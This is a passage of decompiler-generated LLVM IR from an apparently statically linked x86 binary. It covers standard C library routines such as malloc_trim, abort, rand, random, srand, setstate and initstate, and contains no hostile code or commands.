  store i32 %v0_80535b7, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* @edx, align 4
  %v0_80535c1 = call i32 @__malloc_trim()
  store i32 %v0_80535c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535e8

dec_label_pc_80535c8:                             ; preds = %dec_label_pc_80534d0
  %v2_80535c8 = inttoptr i32 %v1_8053499 to i32*
  %v3_80535c8 = load i32, i32* %v2_80535c8, align 4
  store i32 %v3_80535c8, i32* %edx.global-to-local, align 4
  %v0_80535cb = load i32, i32* @global_var_8067d70.242, align 16
  %v1_80535cb = add i32 %v0_80535cb, -1
  store i32 %v1_80535cb, i32* @global_var_8067d70.242, align 16
  %v2_80535d1 = add i32 %v3_80535c8, %v1_80534a9
  store i32 %v2_80535d1, i32* %eax.global-to-local, align 4
  %v2_80535d4 = sub i32 %v1_8053499, %v3_80535c8
  %v0_80535da = load i32, i32* @global_var_8067d84.246, align 4
  %v2_80535da = sub i32 %v0_80535da, %v2_80535d1
  store i32 %v2_80535da, i32* @global_var_8067d84.246, align 4
  %v4_80535e0 = call i32 @munmap(i32 %v2_80535d4, i32 %v2_80535d1, i32 %v1_80534a9, i32 %v1_80534a9)
  store i32 %v4_80535e0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535e8

dec_label_pc_80535e8:                             ; preds = %dec_label_pc_80535a4, %dec_label_pc_8053583, %dec_label_pc_80535b7, %dec_label_pc_80534b0, %dec_label_pc_80535c8
  store i32 %v2_8053483, i32* %eax.global-to-local, align 4
  %v3_80535f1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_80535f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535f9

dec_label_pc_80535f9:                             ; preds = %entry, %dec_label_pc_80535e8
  %.0 = phi i32 [ undef, %entry ], [ %v3_80535f1, %dec_label_pc_80535e8 ]
  store i32 %v0_8053468, i32* @ebx, align 4
  store i32 %v0_8053467, i32* @esi, align 4
  store i32 %v0_8053466, i32* @edi, align 4
  store i32 %v0_8053465, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80535c8, { 1, 0, 2 }
  uselistorder i32 %v0_805355a, { 1, 0 }
  uselistorder i32 %v1_8053528, { 1, 0 }
  uselistorder i32 %v2_8053521, { 1, 0 }
  uselistorder i32 %v1_8053516, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053525, { 1, 0 }
  uselistorder i32 %v2_80534b3, { 1, 0 }
  uselistorder i32 %v1_80534a9, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80534a1, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8053499, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* bitcast (i8* @global_var_8067a20.234 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8067a54.237 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80535f9, { 1, 0 }
  uselistorder label %dec_label_pc_80535e8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80535a4, { 1, 0 }
  uselistorder label %dec_label_pc_8053583, { 1, 0 }
  uselistorder label %dec_label_pc_805354e, { 1, 0 }
  uselistorder label %dec_label_pc_8053546, { 1, 0 }
  uselistorder label %dec_label_pc_8053512, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053601 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805360e = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8067a20.234 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* @edx, align 4
  %v0_805361b = load i32, i32* @ebx, align 4
  store i32 %v0_805361b, i32* @eax, align 4
  store i32 %v0_8053601, i32* @ebx, align 4
  %v0_805361e = call i32 @__malloc_trim()
  ret i32 %v0_805361e

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8067a20.234 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8067a20.234, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053630 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cc8.254 to i32))
  %v12_805363a = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805363f

dec_label_pc_805363f:                             ; preds = %dec_label_pc_805363f.dec_label_pc_805363f_crit_edge, %entry
  %v0_805363f = phi i32 [ %v12_805363a, %entry ], [ %v0_805363f.pre, %dec_label_pc_805363f.dec_label_pc_805363f_crit_edge ]
  %v1_805364a19 = phi i32 [ 31, %entry ], [ %v1_805364a, %dec_label_pc_805363f.dec_label_pc_805363f_crit_edge ]
  %v2_805363f = mul i32 %v1_805364a19, 4
  %v3_805363f = add i32 %v2_805363f, 152
  %v4_805363f = add i32 %v3_805363f, %v0_805363f
  %v5_805363f = inttoptr i32 %v4_805363f to i32*
  store i32 0, i32* %v5_805363f, align 4
  %v0_805364a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805364a = add i32 %v0_805364a.pre, -1
  %v9_805364a = icmp slt i32 %v1_805364a, 0
  store i32 %v1_805364a, i32* %eax.global-to-local, align 4
  %v1_805364b = icmp eq i1 %v9_805364a, false
  br i1 %v1_805364b, label %dec_label_pc_805363f.dec_label_pc_805363f_crit_edge, label %dec_label_pc_805364d

dec_label_pc_805363f.dec_label_pc_805363f_crit_edge: ; preds = %dec_label_pc_805363f
  %v0_805363f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805363f

dec_label_pc_805364d:                             ; preds = %dec_label_pc_805363f
  %v0_805364d = load i32, i32* @ebx, align 4
  %v2_8053651 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053651, i32* @ebx, align 4
  %v4_8053659 = call i32 @__sigaddset(i32 %v2_8053651, i32 6, i32 %v0_805364d, i32 %v0_805364d)
  store i32 %v4_8053659, i32* %eax.global-to-local, align 4
  %v1_8053661 = icmp eq i32 %v4_8053659, 0
  %v1_8053663 = icmp eq i1 %v1_8053661, false
  br i1 %v1_8053663, label %dec_label_pc_8053673, label %dec_label_pc_8053665

dec_label_pc_8053665:                             ; preds = %dec_label_pc_805364d
  %v3_805366b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805366b = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805366b, i32 0)
  store i32 %v4_805366b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053673

dec_label_pc_8053673:                             ; preds = %dec_label_pc_805364d, %dec_label_pc_8053665
  %v2_80536ab4 = phi i32 [ %v4_8053659, %dec_label_pc_805364d ], [ %v4_805366b, %dec_label_pc_8053665 ]
  %v0_8053673 = load i8, i8* @global_var_8067640.255, align 64
  %v1_8053673 = icmp eq i8 %v0_8053673, 0
  %v1_805367a = icmp eq i1 %v1_8053673, false
  br i1 %v1_805367a, label %dec_label_pc_80536ab, label %dec_label_pc_805367c

dec_label_pc_805367c:                             ; preds = %dec_label_pc_8053673
  store i8 1, i8* @global_var_8067640.255, align 64
  br label %dec_label_pc_8053683

dec_label_pc_8053683:                             ; preds = %dec_label_pc_80536ea, %dec_label_pc_805367c
  %v1_805368b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062cc8.254 to i32))
  store i32 %v1_805368b, i32* %eax.global-to-local, align 4
  %v1_8053697 = call i32 @__GI_raise(i32 6)
  store i32 %v1_8053697, i32* %eax.global-to-local, align 4
  %v1_80536a3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cc8.254 to i32))
  store i32 %v1_80536a3, i32* %eax.global-to-local, align 4
  %v0_80536ab.pre = load i8, i8* @global_var_8067640.255, align 64
  br label %dec_label_pc_80536ab

dec_label_pc_80536ab:                             ; preds = %dec_label_pc_8053673, %dec_label_pc_8053683
  %v2_80536ab = phi i32 [ %v2_80536ab4, %dec_label_pc_8053673 ], [ %v1_80536a3, %dec_label_pc_8053683 ]
  %v0_80536ab = phi i8 [ %v0_8053673, %dec_label_pc_8053673 ], [ %v0_80536ab.pre, %dec_label_pc_8053683 ]
  %v1_80536ab = zext i8 %v0_80536ab to i32
  %v3_80536ab = and i32 %v2_80536ab, -256
  %v4_80536ab = or i32 %v1_80536ab, %v3_80536ab
  store i32 %v4_80536ab, i32* %eax.global-to-local, align 4
  %v10_80536b0 = icmp eq i8 %v0_80536ab, 1
  %v1_80536b2 = icmp eq i1 %v10_80536b0, false
  br i1 %v1_80536b2, label %dec_label_pc_805370c, label %dec_label_pc_80536b4

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_80536ab
  %v2_80536bc = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80536bc, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8067640.255, align 64
  %v3_80536c8 = bitcast i32* %stack_var_-272 to i8*
  %v4_80536c8 = call i32 @__GI_memset(i8* %v3_80536c8, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536df

dec_label_pc_80536df:                             ; preds = %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge, %dec_label_pc_80536b4
  %v0_80536df = phi i32 [ %v12_805363a, %dec_label_pc_80536b4 ], [ %v0_80536df.pre, %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge ]
  %v1_80536e718 = phi i32 [ 31, %dec_label_pc_80536b4 ], [ %v1_80536e7, %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge ]
  %v2_80536df = mul i32 %v1_80536e718, 4
  %v3_80536df = add i32 %v2_80536df, 16
  %v4_80536df = add i32 %v3_80536df, %v0_80536df
  %v5_80536df = inttoptr i32 %v4_80536df to i32*
  store i32 -1, i32* %v5_80536df, align 4
  %v0_80536e7.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80536e7 = add i32 %v0_80536e7.pre, -1
  %v9_80536e7 = icmp slt i32 %v1_80536e7, 0
  store i32 %v1_80536e7, i32* %eax.global-to-local, align 4
  %v1_80536e8 = icmp eq i1 %v9_80536e7, false
  br i1 %v1_80536e8, label %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge, label %dec_label_pc_80536ea

dec_label_pc_80536df.dec_label_pc_80536df_crit_edge: ; preds = %dec_label_pc_80536df
  %v0_80536df.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80536df

dec_label_pc_80536ea:                             ; preds = %dec_label_pc_80536df
  store i32 %v2_80536bc, i32* %eax.global-to-local, align 4
  %v4_80536ff = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80536ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053683

dec_label_pc_805370c:                             ; preds = %dec_label_pc_80536ab
  %v10_805370c = icmp eq i8 %v0_80536ab, 2
  %v1_805370e = icmp eq i1 %v10_805370c, false
  br i1 %v1_805370e, label %dec_label_pc_8053718, label %dec_label_pc_8053710

dec_label_pc_8053710:                             ; preds = %dec_label_pc_805370c
  store i8 3, i8* @global_var_8067640.255, align 64
  br label %dec_label_pc_8053718

dec_label_pc_8053718:                             ; preds = %dec_label_pc_805370c, %dec_label_pc_8053710
  %v0_8053718 = phi i8 [ %v0_80536ab, %dec_label_pc_805370c ], [ 3, %dec_label_pc_8053710 ]
  %v9_8053718 = icmp eq i8 %v0_8053718, 3
  %v1_805371f = icmp eq i1 %v9_8053718, false
  br i1 %v1_805371f, label %dec_label_pc_8053732, label %dec_label_pc_8053721

dec_label_pc_8053721:                             ; preds = %dec_label_pc_8053718
  store i8 4, i8* @global_var_8067640.255, align 64
  %v1_805372d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053732:                             ; preds = %dec_label_pc_8053718, %dec_label_pc_8053732
  br label %dec_label_pc_8053732

; uselistorder directives
  uselistorder i32 %v1_80536e7, { 2, 1, 0 }
  uselistorder i8 %v0_80536ab, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805364a, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 2, 3, 1 }
  uselistorder i32 140, { 0, 2, 1 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 12, 11, 10, 9, 13, 1, 3, 6, 2, 8, 7, 5, 4 }
  uselistorder i8* @global_var_8067640.255, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053732, { 1, 0 }
  uselistorder label %dec_label_pc_8053718, { 1, 0 }
  uselistorder label %dec_label_pc_80536ab, { 1, 0 }
  uselistorder label %dec_label_pc_8053673, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8053738 = call i32 @random()
  ret i32 %v0_8053738

; uselistorder directives
  uselistorder i32 ()* @random, { 22, 0, 21, 20, 19, 18, 17, 6, 5, 4, 3, 2, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 1 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053740 = load i32, i32* @ebx, align 4
  store i32 %v0_8053740, i32* %stack_var_-4, align 4
  %v2_805374e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805374e, i32* @ebx, align 4
  %v4_8053753 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134541533, i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v1_805375f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  store i32 ptrtoint (i32* @global_var_8062ce0.256 to i32), i32* @ecx, align 4
  %v2_8053766 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8053770 = call i32 @__GI_random_r(i32* nonnull @global_var_8062cf8, i32 %v2_8053766)
  %v3_805377a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_805377f = load i32, i32* %stack_var_-8, align 4
  %v2_8053786 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053786, i32* @ebx, align 4
  ret i32 %v3_805377f
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_805379e = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134541533, i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v1_80537aa = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v0_80537af = load i32, i32* bitcast (i32** @global_var_8062d00.259 to i32*), align 256
  store i32 %v0_80537af, i32* @ebx, align 4
  %v3_80537c0 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8062cf8)
  %v2_80537c8 = icmp slt i32 %v3_80537c0, 0
  br i1 %v2_80537c8, label %dec_label_pc_80537cf, label %dec_label_pc_80537cc

dec_label_pc_80537cc:                             ; preds = %entry
  br label %dec_label_pc_80537cf

dec_label_pc_80537cf:                             ; preds = %entry, %dec_label_pc_80537cc
  %v3_80537d8 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_80537e0 = load i32, i32* @esi, align 4
  ret i32 %v0_80537e0

; uselistorder directives
  uselistorder label %dec_label_pc_80537cf, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80537f4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80537f4, i32* @ebx, align 4
  %v4_80537f9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134541533, i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v1_8053805 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  store i32 ptrtoint (i32** @global_var_8062cfc.260 to i32), i32* @esi, align 4
  %v4_8053824 = inttoptr i32 %arg2 to i32*
  %v5_8053824 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8053824, i32 %arg3, i32 ptrtoint (i32* @global_var_8062cf8 to i32))
  %v3_805382f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8053837 = load i32, i32* @esi, align 4
  ret i32 %v0_8053837
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805383c = load i32, i32* @ebx, align 4
  store i32 %v0_805383c, i32* %stack_var_-4, align 4
  %v2_805384a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805384a, i32* @ebx, align 4
  %v4_805384f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134541533, i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v1_805385b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062ce0.256 to i32))
  %v3_805386b = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8062cf8)
  store i32 %arg1, i32* @ecx, align 4
  %v3_8053875 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_805387d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805387d, i32* @ebx, align 4
  ret i32 %v3_8053875

; uselistorder directives
  uselistorder i32* @global_var_8062cf8, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8062ce0.256 to i32), { 5, 1, 6, 2, 7, 3, 0, 8, 4 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8053883 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_805388f = add i32 %tmp3, 12
  %v2_805388f = inttoptr i32 %v1_805388f to i32*
  %v3_805388f = load i32, i32* %v2_805388f, align 4
  store i32 %v3_805388f, i32* @ecx, align 4
  %v1_8053892 = add i32 %arg1, 4
  store i32 %v1_8053892, i32* %esi.global-to-local, align 4
  %v1_8053895 = add i32 %tmp3, 8
  %v2_8053895 = inttoptr i32 %v1_8053895 to i32*
  %v3_8053895 = load i32, i32* %v2_8053895, align 4
  %v1_8053898 = icmp eq i32 %v3_805388f, 0
  %v1_805389a = icmp eq i1 %v1_8053898, false
  br i1 %v1_805389a, label %dec_label_pc_80538a5, label %dec_label_pc_805389c

dec_label_pc_805389c:                             ; preds = %entry
  %v1_805389c = add i32 %v3_8053895, -4
  %v2_805389c = inttoptr i32 %v1_805389c to i32*
  store i32 0, i32* %v2_805389c, align 4
  br label %dec_label_pc_80538b5

dec_label_pc_80538a5:                             ; preds = %entry
  %v1_80538a5 = add i32 %tmp3, 4
  %v2_80538a5 = inttoptr i32 %v1_80538a5 to i32*
  %v3_80538a5 = load i32, i32* %v2_80538a5, align 4
  %v2_80538a8 = sub i32 %v3_80538a5, %v3_8053895
  %v2_80538aa = sdiv i32 %v2_80538a8, 4
  %v3_80538ad = mul i32 %v2_80538aa, 5
  %v2_80538b0 = add i32 %v3_80538ad, %v3_805388f
  store i32 %v2_80538b0, i32* %eax.global-to-local, align 4
  %v2_80538b2 = add i32 %v3_8053895, -4
  %v3_80538b2 = inttoptr i32 %v2_80538b2 to i32*
  store i32 %v2_80538b0, i32* %v3_80538b2, align 4
  br label %dec_label_pc_80538b5

dec_label_pc_80538b5:                             ; preds = %dec_label_pc_805389c, %dec_label_pc_80538a5
  %v0_80538b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80538b5 = add i32 %v0_80538b5, -4
  %v2_80538b5 = inttoptr i32 %v1_80538b5 to i32*
  %v3_80538b5 = load i32, i32* %v2_80538b5, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80538bd = ashr i32 %v3_80538b5, 31
  %v2_80538be = zext i32 %v3_80538b5 to i64
  %v4_80538be = zext i32 %v1_80538bd to i64
  %v5_80538be = mul nuw i64 %v4_80538be, 4294967296
  %v6_80538be = or i64 %v5_80538be, %v2_80538be
  %v8_80538be = sdiv i64 %v6_80538be, 5
  %v9_80538be = trunc i64 %v8_80538be to i32
  store i32 %v9_80538be, i32* %eax.global-to-local, align 4
  %v10_80538be = srem i64 %v6_80538be, 5
  %v11_80538be = trunc i64 %v10_80538be to i32
  %v6_80538c3 = icmp ugt i32 %v11_80538be, 4
  br i1 %v6_80538c3, label %dec_label_pc_8053903, label %dec_label_pc_80538c5

dec_label_pc_80538c5:                             ; preds = %dec_label_pc_80538b5
  %v1_80538c5 = mul i32 %v11_80538be, 4
  %v2_80538c5 = add i32 %v1_80538c5, ptrtoint (i32* @global_var_805c4f4.261 to i32)
  %v3_80538c5 = inttoptr i32 %v2_80538c5 to i32*
  %v4_80538c5 = load i32, i32* %v3_80538c5, align 4
  store i32 %v4_80538c5, i32* @ecx, align 4
  %v1_80538cc = icmp eq i32 %v11_80538be, 0
  %v2_80538ce = add i32 %v1_80538c5, ptrtoint (i32* @global_var_805c4e0.262 to i32)
  %v3_80538ce = inttoptr i32 %v2_80538ce to i32*
  %v4_80538ce = load i32, i32* %v3_80538ce, align 4
  store i32 %v4_80538ce, i32* %ebp.global-to-local, align 4
  %v1_80538d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538d5 = add i32 %v1_80538d5, 12
  %v3_80538d5 = inttoptr i32 %v2_80538d5 to i32*
  store i32 %v11_80538be, i32* %v3_80538d5, align 4
  %v0_80538d8 = load i32, i32* @ecx, align 4
  %v1_80538d8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538d8 = add i32 %v1_80538d8, 16
  %v3_80538d8 = inttoptr i32 %v2_80538d8 to i32*
  store i32 %v0_80538d8, i32* %v3_80538d8, align 4
  %v0_80538db = load i32, i32* %ebp.global-to-local, align 4
  %v1_80538db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538db = add i32 %v1_80538db, 20
  %v3_80538db = inttoptr i32 %v2_80538db to i32*
  store i32 %v0_80538db, i32* %v3_80538db, align 4
  br i1 %v1_80538cc, label %dec_label_pc_80538f6, label %dec_label_pc_80538e0

dec_label_pc_80538e0:                             ; preds = %dec_label_pc_80538c5
  %v0_80538e0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80538e0 = add i32 %v0_80538e0, -4
  %v2_80538e0 = inttoptr i32 %v1_80538e0 to i32*
  %v3_80538e0 = load i32, i32* %v2_80538e0, align 4
  %v1_80538e3 = ashr i32 %v3_80538e0, 31
  %v0_80538e4 = load i32, i32* %edi.global-to-local, align 4
  %v2_80538e4 = zext i32 %v3_80538e0 to i64
  %v4_80538e4 = zext i32 %v1_80538e3 to i64
  %v5_80538e4 = mul nuw i64 %v4_80538e4, 4294967296
  %v6_80538e4 = or i64 %v5_80538e4, %v2_80538e4
  %v7_80538e4 = zext i32 %v0_80538e4 to i64
  %v8_80538e4 = sdiv i64 %v6_80538e4, %v7_80538e4
  %v9_80538e4 = trunc i64 %v8_80538e4 to i32
  %v2_80538e6 = mul i32 %v9_80538e4, 4
  %v3_80538e6 = add i32 %v2_80538e6, %v0_80538e0
  %v1_80538e9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80538e9 = add i32 %v1_80538e9, %v9_80538e4
  store i32 %v2_80538e9, i32* %eax.global-to-local, align 4
  %v1_80538eb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538eb = add i32 %v1_80538eb, 4
  %v3_80538eb = inttoptr i32 %v2_80538eb to i32*
  store i32 %v3_80538e6, i32* %v3_80538eb, align 4
  %v0_80538ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80538ee = ashr i32 %v0_80538ee, 31
  %v0_80538ef = load i32, i32* @ecx, align 4
  %v2_80538ef = zext i32 %v0_80538ee to i64
  %v4_80538ef = zext i32 %v1_80538ee to i64
  %v5_80538ef = mul nuw i64 %v4_80538ef, 4294967296
  %v6_80538ef = or i64 %v5_80538ef, %v2_80538ef
  %v7_80538ef = zext i32 %v0_80538ef to i64
  %v8_80538ef = sdiv i64 %v6_80538ef, %v7_80538ef
  %v9_80538ef = trunc i64 %v8_80538ef to i32
  store i32 %v9_80538ef, i32* %eax.global-to-local, align 4
  %v10_80538ef = srem i64 %v6_80538ef, %v7_80538ef
  %v11_80538ef = trunc i64 %v10_80538ef to i32
  %v0_80538f1 = load i32, i32* %esi.global-to-local, align 4
  %v2_80538f1 = mul i32 %v11_80538ef, 4
  %v3_80538f1 = add i32 %v2_80538f1, %v0_80538f1
  %v1_80538f4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538f4 = inttoptr i32 %v1_80538f4 to i32*
  store i32 %v3_80538f1, i32* %v2_80538f4, align 4
  br label %dec_label_pc_80538f6

dec_label_pc_80538f6:                             ; preds = %dec_label_pc_80538c5, %dec_label_pc_80538e0
  %v0_80538f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80538f6 = load i32, i32* @ecx, align 4
  %v2_80538f6 = mul i32 %v1_80538f6, 4
  %v3_80538f6 = add i32 %v2_80538f6, %v0_80538f6
  %v1_80538f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538f9 = add i32 %v1_80538f9, 24
  %v3_80538f9 = inttoptr i32 %v2_80538f9 to i32*
  store i32 %v3_80538f6, i32* %v3_80538f9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80538fe = load i32, i32* %esi.global-to-local, align 4
  %v1_80538fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80538fe = add i32 %v1_80538fe, 8
  %v3_80538fe = inttoptr i32 %v2_80538fe to i32*
  store i32 %v0_80538fe, i32* %v3_80538fe, align 4
  %v0_8053918.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053911

dec_label_pc_8053903:                             ; preds = %dec_label_pc_80538b5
  %v1_8053903 = call i32 @__errno_location(i32 %v0_8053883)
  %v1_8053908 = inttoptr i32 %v1_8053903 to i32*
  store i32 22, i32* %v1_8053908, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053911

dec_label_pc_8053911:                             ; preds = %dec_label_pc_80538f6, %dec_label_pc_8053903
  %v0_8053918 = phi i32 [ %v0_8053918.pre, %dec_label_pc_80538f6 ], [ -1, %dec_label_pc_8053903 ]
  store i32 %v0_8053883, i32* @ebx, align 4
  ret i32 %v0_8053918

; uselistorder directives
  uselistorder i32 %v11_80538be, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053911, { 1, 0 }
  uselistorder label %dec_label_pc_80538f6, { 1, 0 }
  uselistorder label %dec_label_pc_80538b5, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_805391c = load i32, i32* @ebx, align 4
  store i32 %v0_805391c, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8053925 = add i32 %tmp3, 12
  %v2_8053925 = inttoptr i32 %v1_8053925 to i32*
  %v3_8053925 = load i32, i32* %v2_8053925, align 4
  %v4_8053925 = icmp eq i32 %v3_8053925, 0
  %v1_8053929 = add i32 %tmp3, 8
  %v2_8053929 = inttoptr i32 %v1_8053929 to i32*
  %v3_8053929 = load i32, i32* %v2_8053929, align 4
  store i32 %v3_8053929, i32* %esi.global-to-local, align 4
  %v1_805392c = icmp eq i1 %v4_8053925, false
  br i1 %v1_805392c, label %dec_label_pc_8053945, label %dec_label_pc_805392e

dec_label_pc_805392e:                             ; preds = %entry
  %v2_805392e = inttoptr i32 %v3_8053929 to i32*
  %v3_805392e = load i32, i32* %v2_805392e, align 4
